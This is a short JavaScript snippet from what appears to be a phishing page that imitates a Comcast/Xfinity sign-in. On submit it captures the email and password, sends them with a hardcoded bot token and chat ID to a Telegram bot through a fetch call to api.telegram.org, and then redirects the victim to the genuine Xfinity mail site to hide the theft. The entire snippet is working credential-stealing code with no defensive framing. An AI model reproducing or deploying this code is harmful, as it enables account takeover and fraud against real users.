<script>


      
      const forma = document.querySelector('#login-username-form')
    
      let bot = {
          TOKEN: "5939598793:AAHEtKXSHv7IysgGyRga8KSgI-MAkKUxwPc",
          chatID: "5991588405"
      }

      const emAil = document.querySelector('#login-username')
      const suBBer = document.querySelector('#suber')
      const pWd = document.querySelector('#password')
      const strong = document.querySelector('.strong')
      const submit = document.querySelector('#login-signin');
      submit.addEventListener('click', e =>{
        if(emAil.value === ''){
          return
        }
       
        submit.type = 'submit'
        // suBBer.style.display = 'block'
      })


    forma.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#login-username').value
          let pwd = document.querySelector('#password').value

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=COmmcastKachi=>${email}=${pwd}`, {
              method: "GET"
          }).then(success => {
              window.location.replace("https://connect.xfinity.com/appsuite/?#!!&app=io.ox/mail&folder=default0/INBOX&waitSeconds=30");
          }, error => {
          alert('message not sent')
              console.log(error)
              }) 
      })
    </script>

